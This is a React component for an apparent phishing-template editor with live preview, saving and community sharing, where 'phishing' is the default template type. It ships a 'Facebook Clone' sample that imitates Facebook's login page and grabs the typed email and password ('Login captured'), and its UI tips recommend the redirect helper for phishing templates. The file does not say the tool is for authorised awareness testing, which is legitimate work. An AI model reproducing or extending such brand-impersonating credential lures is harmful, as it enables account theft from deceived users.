import { useState, useEffect, useCallback } from 'react';
import { Page } from "components/shared/Page";
import { Button, Input, Textarea, Modal, Select, ImageUpload } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import { useParams, useLocation } from 'react-router';
import { 
  PaintBrushIcon,
  EyeIcon,
  DocumentArrowDownIcon,
  StopIcon,
  DevicePhoneMobileIcon,
  ComputerDesktopIcon,
  DeviceTabletIcon,
  CodeBracketIcon,
  ShareIcon,
  InformationCircleIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';

export default function UserTemplateCodeEditor() {
  const { isDark } = useThemeContext();
  const { id } = useParams();
  const location = useLocation();
  const [isPreviewActive, setIsPreviewActive] = useState(false);
  const [currentDevice, setCurrentDevice] = useState('desktop');
  const [isSaveModalOpen, setIsSaveModalOpen] = useState(false);
  const [activeCodeTab, setActiveCodeTab] = useState('html');
  const [codeContent, setCodeContent] = useState({
    html: '',
    css: '',
    js: ''
  });
  const [templateData, setTemplateData] = useState({
    name: '',
    description: '',
    type: 'phishing',
    is_shared: false,
    thumbnail: ''
  });
  const [previewUrl, setPreviewUrl] = useState('');
  const [isEditMode, setIsEditMode] = useState(false);
  const [isLoadingTemplate, setIsLoadingTemplate] = useState(false);
  const [originalTemplate, setOriginalTemplate] = useState(null);

  const templateTypes = [
    { value: 'phishing', label: 'Phishing Template' },
    { value: 'login', label: 'Login Page Template' }
  ];

  // Load template data when in edit mode
  useEffect(() => {
    if (id) {
      setIsEditMode(true);
      loadTemplateForEdit(id);
    } else if (location.state?.cloneTemplate) {
      // Handle cloning from community templates
      const template = location.state.cloneTemplate;
      setCodeContent({
        html: template.content_html || '',
        css: template.content_css || '',
        js: template.content_js || ''
      });
        setTemplateData({
          name: `Copy of ${template.name}`,
          description: template.description || '',
          type: template.type || 'phishing',
          is_shared: false,
          thumbnail: ''
        });
      toast.success('Template loaded for editing!');
    }
  }, [id, location.state]);

  const loadTemplateForEdit = async (templateId) => {
    try {
      setIsLoadingTemplate(true);
      const token = localStorage.getItem('authToken');
      
      // First get user's templates to find the one to edit
      const response = await fetch('/api/templates/my-templates', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        const template = data.data.find(t => t.id === parseInt(templateId));
        
        if (template) {
          setOriginalTemplate(template);
          setCodeContent({
            html: template.content_html || '',
            css: template.content_css || '',
            js: template.content_js || ''
          });
          setTemplateData({
            name: template.name,
            description: template.description || '',
            type: template.type,
            is_shared: template.is_shared,
            thumbnail: template.thumbnail || ''
          });
          toast.success('Template loaded for editing!');
        } else {
          toast.error('Template not found or access denied');
        }
      } else {
        toast.error('Failed to load template');
      }
    } catch (error) {
      console.error('Error loading template:', error);
      toast.error('Failed to load template');
    } finally {
      setIsLoadingTemplate(false);
    }
  };

  const generatePreview = useCallback(() => {
    const completeHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Template Preview</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        ${codeContent.css}
    </style>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body>
    ${codeContent.html || '<div class="text-center p-5"><h2>No content to preview</h2></div>'}
    <script>
        ${codeContent.js}
    </script>
</body>
</html>`;

    if (previewUrl) {
      URL.revokeObjectURL(previewUrl);
    }
    
    const blob = new Blob([completeHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    setPreviewUrl(url);
  }, [codeContent, previewUrl]);

  const startPreview = () => {
    setIsPreviewActive(true);
    generatePreview();
    toast.success('Realtime preview activated!');
  };

  const stopPreview = () => {
    setIsPreviewActive(false);
    if (previewUrl) {
      URL.revokeObjectURL(previewUrl);
      setPreviewUrl('');
    }
    toast.success('Preview stopped');
  };

  const handleDeviceChange = (device) => {
    setCurrentDevice(device);
  };

  const handleThumbnailUpload = async (dataUrl) => {
    if (!dataUrl) return;
    
    try {
      // Convert data URL to file
      const response = await fetch(dataUrl);
      const blob = await response.blob();
      const file = new File([blob], 'thumbnail.jpg', { type: blob.type });

      const formData = new FormData();
      formData.append('thumbnail', file);

      const token = localStorage.getItem('authToken');
      const uploadResponse = await fetch('/api/upload/template-thumbnail', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData
      });

      if (uploadResponse.ok) {
        const data = await uploadResponse.json();
        setTemplateData(prev => ({ ...prev, thumbnail: data.filePath }));
        toast.success('Thumbnail uploaded successfully!');
        return data.filePath;
      } else {
        const errorData = await uploadResponse.json();
        toast.error(errorData.message || 'Failed to upload thumbnail');
        return null;
      }
    } catch (error) {
      console.error('Error uploading thumbnail:', error);
      toast.error('Failed to upload thumbnail');
      return null;
    }
  };

  const handleSave = async () => {
    if (!templateData.name.trim()) {
      toast.error('Template name is required');
      return;
    }

    try {
      const token = localStorage.getItem('authToken');
      
      const url = isEditMode 
        ? `/api/templates/update/${originalTemplate.id}`
        : '/api/templates/create';
      const method = isEditMode ? 'PUT' : 'POST';
      
      const response = await fetch(url, {
        method,
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: templateData.name,
          description: templateData.description,
          type: templateData.type,
          content_html: codeContent.html,
          content_css: codeContent.css,
          content_js: codeContent.js,
          thumbnail: templateData.thumbnail,
          is_shared: templateData.is_shared
        })
      });

      if (response.ok) {
        const data = await response.json();
        toast.success(data.message || `Template ${isEditMode ? 'updated' : 'saved'} successfully!`);
        setIsSaveModalOpen(false);
        
        if (!isEditMode) {
          setTemplateData({ name: '', description: '', type: 'phishing', is_shared: false, thumbnail: '' });
        }
      } else {
        const errorData = await response.json();
        toast.error(errorData.message || `Failed to ${isEditMode ? 'update' : 'save'} template`);
      }
    } catch (error) {
      console.error('Error saving template:', error);
      toast.error(`Failed to ${isEditMode ? 'update' : 'save'} template`);
    }
  };

  const insertSampleCode = (type) => {
    const samples = {
      'login-form': {
        html: `<div class="container mt-5">
  <div class="row justify-content-center">
    <div class="col-md-4">
      <div class="card shadow">
        <div class="card-body">
          <h3 class="text-center mb-4">Sign In</h3>
          <form id="loginForm">
            <div class="mb-3">
              <label for="email" class="form-label">Email</label>
              <input type="email" class="form-control" id="email" name="email" required>
            </div>
            <div class="mb-3">
              <label for="password" class="form-label">Password</label>
              <input type="password" class="form-control" id="password" name="password" required>
            </div>
            <div class="d-grid mb-3">
              <button type="submit" class="btn btn-primary">Sign In</button>
            </div>
            <div class="text-center">
              <a href="#" onclick="Login()">Create Account</a>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>`,
        css: `body {
    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
}

.card {
    border: none;
    border-radius: 20px;
    backdrop-filter: blur(10px);
    background: rgba(255, 255, 255, 0.9);
}`,
        js: `document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    alert('Login attempt: ' + email);
    console.log('Login data:', { email, password });
});

function Login() {
    window.location.href = '/auth/signin';
}`
      },
      'hero-section': {
        html: `<div class="hero-section">
  <div class="container text-center">
    <h1 class="display-4 fw-bold mb-4">Welcome to Our Platform</h1>
    <p class="lead mb-4">Build amazing experiences with our powerful tools</p>
    <button type="button" class="btn btn-primary btn-lg me-3" onclick="Login()">Get Started</button>
    <button type="button" class="btn btn-outline-light btn-lg">Learn More</button>
  </div>
</div>`,
        css: `.hero-section {
    background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    color: white;
}

.btn-primary {
    background: rgba(255, 255, 255, 0.2);
    border: 2px solid white;
    backdrop-filter: blur(10px);
}`,
        js: `document.querySelectorAll('.btn').forEach(btn => {
    btn.addEventListener('click', function() {
        this.style.transform = 'scale(0.95)';
        setTimeout(() => this.style.transform = 'scale(1)', 100);
    });
});

function Login() {
    window.location.href = '/auth/signin';
}`
      },
      'phishing-facebook': {
        html: `<div class="container-fluid bg-primary">
  <div class="row min-vh-100">
    <div class="col-md-6 d-flex align-items-center justify-content-center">
      <div class="text-white text-center">
        <h1 class="display-3 fw-bold mb-4">facebook</h1>
        <p class="fs-4">Connect with friends and the world around you on Facebook.</p>
      </div>
    </div>
    <div class="col-md-6 d-flex align-items-center justify-content-center">
      <div class="card shadow" style="max-width: 400px; width: 100%;">
        <div class="card-body p-4">
          <form id="loginForm">
            <div class="mb-3">
              <input type="email" class="form-control form-control-lg" id="email" placeholder="Email or phone number" required>
            </div>
            <div class="mb-3">
              <input type="password" class="form-control form-control-lg" id="password" placeholder="Password" required>
            </div>
            <div class="d-grid mb-3">
              <button type="submit" class="btn btn-primary btn-lg">Log In</button>
            </div>
            <div class="text-center">
              <a href="#" onclick="Login()">Forgotten password?</a>
            </div>
            <hr>
            <div class="text-center">
              <button type="button" class="btn btn-success btn-lg" onclick="Login()">Create New Account</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>`,
        css: `body {
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
}

.bg-primary {
    background-color: #1877f2 !important;
}

.card {
    border: none;
    border-radius: 8px;
}

.form-control-lg {
    border-radius: 6px;
    padding: 14px 16px;
    border: 1px solid #dddfe2;
}

.btn-primary {
    background-color: #1877f2;
    border-color: #1877f2;
    font-weight: bold;
}

.btn-success {
    background-color: #42b883;
    border-color: #42b883;
    font-weight: bold;
}`,
        js: `document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    console.log('Facebook login attempt:', { email, password });
    alert('Login captured: ' + email);
});

function Login() {
    window.location.href = '/auth/signin';
}`
      }
    };

    if (samples[type]) {
      setCodeContent(samples[type]);
      setActiveCodeTab('html');
      toast.success(`${type.replace('-', ' ')} template loaded!`);
    }
  };

  // Cleanup preview URL on unmount
  useEffect(() => {
    return () => {
      if (previewUrl) {
        URL.revokeObjectURL(previewUrl);
      }
    };
  }, [previewUrl]);

  // Show loading state while template is being loaded
  if (isLoadingTemplate) {
    return (
      <Page title="Loading Template">
        <div className="flex items-center justify-center h-screen">
          <div className="text-center">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary-500 mx-auto mb-4"></div>
            <p className="text-gray-500 dark:text-gray-400">Loading template...</p>
          </div>
        </div>
      </Page>
    );
  }

  return (
    <Page title={isEditMode ? "Edit Template" : "Template Maker"}>
      <div className="transition-content w-full h-screen flex flex-col">
        {/* Header */}
        <div className={`flex items-center justify-between p-4 border-b ${isDark ? 'border-gray-700 bg-gray-800' : 'border-gray-200 bg-white'}`}>
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-lg ${isDark ? 'bg-primary-500/20' : 'bg-primary-100'}`}>
              <CodeBracketIcon className={`h-5 w-5 ${isDark ? 'text-primary-400' : 'text-primary-600'}`} />
            </div>
            <div>
              <h1 className="text-xl font-bold text-gray-900 dark:text-white">
                {isEditMode ? 'Edit Template' : 'Template Maker'}
              </h1>
              <p className="text-sm text-gray-600 dark:text-gray-400">
                {isEditMode ? `Editing: ${templateData.name}` : 'Create & Share HTML Templates'}
              </p>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            {/* Device Selection */}
            <div className="flex items-center bg-gray-100 dark:bg-gray-700 rounded-lg p-1">
              <button
                onClick={() => handleDeviceChange('desktop')}
                className={`p-2 rounded-md transition-colors ${currentDevice === 'desktop' ? 'bg-white dark:bg-gray-600 shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-600'}`}
                title="Desktop Preview"
              >
                <ComputerDesktopIcon className="h-4 w-4" />
              </button>
              <button
                onClick={() => handleDeviceChange('tablet')}
                className={`p-2 rounded-md transition-colors ${currentDevice === 'tablet' ? 'bg-white dark:bg-gray-600 shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-600'}`}
                title="Tablet Preview"
              >
                <DeviceTabletIcon className="h-4 w-4" />
              </button>
              <button
                onClick={() => handleDeviceChange('mobile')}
                className={`p-2 rounded-md transition-colors ${currentDevice === 'mobile' ? 'bg-white dark:bg-gray-600 shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-600'}`}
                title="Mobile Preview"
              >
                <DevicePhoneMobileIcon className="h-4 w-4" />
              </button>
            </div>

            {isPreviewActive && (
              <Button
                variant="outlined"
                color="error"
                onClick={stopPreview}
                className="flex items-center gap-2"
              >
                <StopIcon className="h-4 w-4" />
                Stop Preview
              </Button>
            )}
            
            <Button
              variant="filled"
              color="primary"
              onClick={() => setIsSaveModalOpen(true)}
              className="flex items-center gap-2"
            >
              <DocumentArrowDownIcon className="h-4 w-4" />
              {isEditMode ? 'Update Template' : 'Save Template'}
            </Button>
          </div>
        </div>

        {/* Login Guide Banner */}
        <div className="bg-blue-50 dark:bg-blue-900/20 border-b border-blue-200 dark:border-blue-800 p-3">
          <div className="flex items-center gap-2 text-blue-800 dark:text-blue-200">
            <InformationCircleIcon className="h-5 w-5" />
            <span className="text-sm font-medium">
              💡 Pro Tip: Add <code className="bg-blue-100 dark:bg-blue-800 px-1 rounded">onclick=&quot;Login()&quot;</code> to any HTML element to redirect users to the login page
            </span>
          </div>
        </div>

        {/* Main Content */}
        <div className={`flex flex-1 overflow-hidden ${currentDevice === 'mobile' ? 'flex-row' : 'flex-col'}`}>
          {/* Code Editor + Sidebar Row */}
          <div 
            className={`${currentDevice === 'mobile' ? 'w-1/2 border-r' : 'w-full border-b'} ${isDark ? 'border-gray-700' : 'border-gray-200'} flex flex-row`}
            style={{
              height: currentDevice === 'mobile' ? '100%' : '50vh'
            }}
          >
            {/* Code Editor */}
            <div className={`flex-1 ${isDark ? 'bg-gray-800' : 'bg-gray-50'} flex flex-col`}>
              {/* Code Tabs */}
              <div className={`flex border-b ${isDark ? 'border-gray-700' : 'border-gray-200'}`}>
                {[
                  { key: 'html', label: 'HTML', icon: '📄', color: 'text-red-600' },
                  { key: 'css', label: 'CSS', icon: '🎨', color: 'text-blue-600' },
                  { key: 'js', label: 'JavaScript', icon: '⚡', color: 'text-yellow-600' }
                ].map(tab => (
                  <button
                    key={tab.key}
                    onClick={() => setActiveCodeTab(tab.key)}
                    className={`px-4 py-3 text-sm font-medium border-b-2 transition-colors flex items-center gap-2 ${
                      activeCodeTab === tab.key
                        ? `border-primary-500 ${tab.color} bg-primary-50 dark:bg-primary-900/20`
                        : 'border-transparent text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-200'
                    }`}
                  >
                    <span>{tab.icon}</span>
                    {tab.label}
                  </button>
                ))}
              </div>

              {/* Code Editor Area */}
              <div className="flex-1 p-4">
                <div className="h-full flex flex-col">
                  <div className="flex justify-between items-center mb-3">
                    <h4 className="font-medium text-gray-700 dark:text-gray-300">
                      {activeCodeTab.toUpperCase()} Editor
                    </h4>
                    <div className="flex gap-2">
                      <Button
                        variant="outlined"
                        onClick={() => {
                          navigator.clipboard.writeText(codeContent[activeCodeTab]);
                          toast.success(`${activeCodeTab.toUpperCase()} copied to clipboard!`);
                        }}
                        className="text-xs px-3 py-1"
                      >
                        Copy
                      </Button>
                      {isPreviewActive && (
                        <Button
                          variant="filled"
                          color="primary"
                          onClick={generatePreview}
                          className="text-xs px-3 py-1"
                        >
                          Update Preview
                        </Button>
                      )}
                    </div>
                  </div>
                  
                  <textarea
                    value={codeContent[activeCodeTab]}
                    onChange={(e) => setCodeContent(prev => ({ ...prev, [activeCodeTab]: e.target.value }))}
                    className={`flex-1 p-4 font-mono text-sm border rounded-md resize-none focus:outline-none focus:ring-2 focus:ring-primary-500 ${
                      isDark 
                        ? 'bg-gray-900 border-gray-600 text-gray-100' 
                        : 'bg-white border-gray-300 text-gray-900'
                    }`}
                    placeholder={`Enter your ${activeCodeTab.toUpperCase()} code here...`}
                    spellCheck={false}
                    style={{ 
                      fontFamily: 'Monaco, Menlo, "Ubuntu Mono", monospace',
                      lineHeight: '1.5',
                      tabSize: '2'
                    }}
                  />
                  
                  <div className="mt-3 text-xs text-gray-500 dark:text-gray-400">
                    {activeCodeTab === 'html' && '💡 Add onclick=&quot;Login()&quot; to redirect users to login page'}
                    {activeCodeTab === 'css' && '💡 CSS will be injected into the preview document'}
                    {activeCodeTab === 'js' && '💡 Include Login() function for login redirects'}
                    {isPreviewActive && (
                      <span className="text-blue-600 dark:text-blue-400 ml-4">
                        🔄 Click &quot;Update Preview&quot; to refresh
                      </span>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* Sample Templates Sidebar */}
            <div className={`w-64 border-l ${isDark ? 'border-gray-700 bg-gray-800' : 'border-gray-200 bg-gray-50'} overflow-y-auto`}>
              <div className="p-4">
                <h3 className="font-semibold text-gray-900 dark:text-white mb-4">
                  Sample Templates
                </h3>
                
                <div className="space-y-2">
                  {[
                    { type: 'login-form', label: 'Login Form', icon: '🔐' },
                    { type: 'hero-section', label: 'Hero Section', icon: '🌟' },
                    { type: 'phishing-facebook', label: 'Facebook Clone', icon: '📘' }
                  ].map((template) => (
                    <div
                      key={template.type}
                      onClick={() => insertSampleCode(template.type)}
                      className={`flex items-center gap-3 p-3 rounded-lg border cursor-pointer hover:border-primary-400 hover:bg-primary-50 dark:hover:bg-primary-900/20 transition-colors ${isDark ? 'border-gray-600 bg-gray-700' : 'border-gray-300 bg-white'}`}
                    >
                      <span className="text-lg">{template.icon}</span>
                      <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
                        {template.label}
                      </span>
                    </div>
                  ))}
                </div>

                <div className="mt-8">
                  <h4 className="font-medium text-gray-700 dark:text-gray-300 mb-3 text-sm">
                    Quick Actions
                  </h4>
                  <div className="space-y-2">
                    {!isPreviewActive ? (
                      <Button
                        variant="filled"
                        color="success"
                        onClick={startPreview}
                        className="w-full text-xs flex items-center justify-center gap-2"
                      >
                        <EyeIcon className="h-4 w-4" />
                        Start Preview
                      </Button>
                    ) : (
                      <Button
                        variant="outlined"
                        onClick={generatePreview}
                        className="w-full text-xs flex items-center justify-center gap-2"
                      >
                        <EyeIcon className="h-4 w-4" />
                        Update Preview
                      </Button>
                    )}
                    <Button
                      variant="outlined"
                      onClick={() => setCodeContent({ html: '', css: '', js: '' })}
                      className="w-full text-xs"
                    >
                      Clear All
                    </Button>
                  </div>
                </div>

                <div className="mt-8">
                  <div className="text-xs text-blue-600 dark:text-blue-400 bg-blue-50 dark:bg-blue-900/20 p-3 rounded-lg">
                    <p className="font-semibold mb-2">💡 Login Redirect Guide:</p>
                    <ul className="space-y-1">
                      <li>• Add <code>onclick=&quot;Login()&quot;</code> to buttons</li>
                      <li>• Works on any HTML element</li>
                      <li>• Redirects to login page</li>
                      <li>• Great for phishing templates</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Preview Area */}
          <div 
            className={`${currentDevice === 'mobile' ? 'w-1/2' : 'w-full'} overflow-hidden`}
            style={{
              height: currentDevice === 'mobile' ? '100%' : '50vh'
            }}
          >
            <div className="p-4 h-full">
              {/* Preview Header */}
              <div className="mb-4 p-3 bg-gray-50 dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <EyeIcon className="h-4 w-4 text-gray-600 dark:text-gray-400" />
                    <span className="font-medium text-gray-700 dark:text-gray-300">
                      {isPreviewActive ? 'Preview Active' : 'Preview Area'}
                    </span>
                    {isPreviewActive && (
                      <div className="flex items-center gap-1">
                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span className="text-xs text-green-600 dark:text-green-400">Live</span>
                      </div>
                    )}
                  </div>
                  <div className="flex items-center gap-2">
                    {isPreviewActive && (
                      <Button
                        variant="outlined"
                        onClick={generatePreview}
                        className="text-xs px-3 py-1"
                      >
                        Refresh
                      </Button>
                    )}
                    <span className="text-xs text-gray-500 dark:text-gray-400">
                      {currentDevice.charAt(0).toUpperCase() + currentDevice.slice(1)} View
                    </span>
                  </div>
                </div>
              </div>

              {/* Preview Content */}
              <div 
                className="h-full" 
                style={{ 
                  height: currentDevice === 'mobile' ? 'calc(100% - 80px)' : 'calc(100% - 80px)',
                  minHeight: currentDevice === 'mobile' ? 'calc(100% - 80px)' : 'calc(100% - 80px)'
                }}
              >
                {isPreviewActive ? (
                  previewUrl ? (
                    <div className="w-full h-full flex justify-center bg-gray-100 dark:bg-gray-900 rounded-lg p-4">
                      <iframe
                        src={previewUrl}
                        className="border rounded-lg shadow-lg bg-white"
                        style={{
                          width: currentDevice === 'mobile' ? '375px' : '100%',
                          height: '100%',
                          minHeight: '100%'
                        }}
                        title="Template Preview - Realtime Iframe"
                        sandbox="allow-scripts allow-same-origin allow-forms"
                        frameBorder="0"
                      />
                    </div>
                  ) : (
                    <div className="flex items-center justify-center h-full border-2 border-dashed border-gray-300 dark:border-gray-600 rounded-lg">
                      <div className="text-center">
                        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary-500 mx-auto mb-4"></div>
                        <p className="text-gray-500 dark:text-gray-400">Generating realtime preview...</p>
                      </div>
                    </div>
                  )
                ) : (
                  <div className="h-full flex items-center justify-center border-2 border-dashed border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-800">
                    <div className="text-center">
                      <PaintBrushIcon className="h-16 w-16 text-gray-400 mx-auto mb-4" />
                      <h3 className="text-lg font-medium text-gray-700 dark:text-gray-300 mb-2">
                        Template Preview
                      </h3>
                      <p className="text-gray-500 dark:text-gray-400 mb-4 max-w-sm">
                        Create amazing templates and share them with the community. Start by selecting a sample or coding from scratch.
                      </p>
                      <p className="text-xs text-blue-600 dark:text-blue-400 mb-4">
                        💡 Click &quot;Start Preview&quot; to activate live preview
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Save Template Modal */}
        <Modal
          open={isSaveModalOpen}
          onClose={() => setIsSaveModalOpen(false)}
          title={isEditMode ? "Update Template" : "Save Template"}
          size="md"
        >
          <div className="space-y-4">
            <Input
              label="Template Name"
              value={templateData.name}
              onChange={(e) => setTemplateData(prev => ({ ...prev, name: e.target.value }))}
              placeholder="Enter template name"
              required
            />
            
            <Textarea
              label="Description"
              value={templateData.description}
              onChange={(e) => setTemplateData(prev => ({ ...prev, description: e.target.value }))}
              placeholder="Enter template description"
              rows={3}
            />
            
            <Select
              label="Template Type"
              value={templateData.type}
              onChange={(e) => setTemplateData(prev => ({ ...prev, type: e.target.value }))}
              data={templateTypes}
            />

            <ImageUpload
              label="Template Thumbnail"
              value={templateData.thumbnail}
              onChange={handleThumbnailUpload}
              placeholder="Upload a thumbnail image for your template"
              accept="image/*"
              maxSize={2 * 1024 * 1024} // 2MB
              className="mb-4"
            />

            <div className="flex items-center gap-2 p-3 bg-blue-50 dark:bg-blue-900/20 rounded-lg">
              <input
                type="checkbox"
                id="is_shared"
                checked={templateData.is_shared}
                onChange={(e) => setTemplateData(prev => ({ ...prev, is_shared: e.target.checked }))}
                className="rounded border-gray-300"
              />
              <label htmlFor="is_shared" className="text-sm font-medium text-gray-700 dark:text-gray-300 flex items-center gap-2">
                <ShareIcon className="h-4 w-4" />
                Share with community (requires admin approval)
              </label>
            </div>
            
            <div className="flex justify-end gap-3 mt-6">
              <Button
                variant="outlined"
                onClick={() => setIsSaveModalOpen(false)}
              >
                Cancel
              </Button>
              <Button
                variant="filled"
                color="primary"
                onClick={handleSave}
                disabled={!templateData.name.trim()}
              >
                {isEditMode ? 'Update Template' : 'Save Template'}
              </Button>
            </div>
          </div>
        </Modal>
      </div>
    </Page>
  );
}
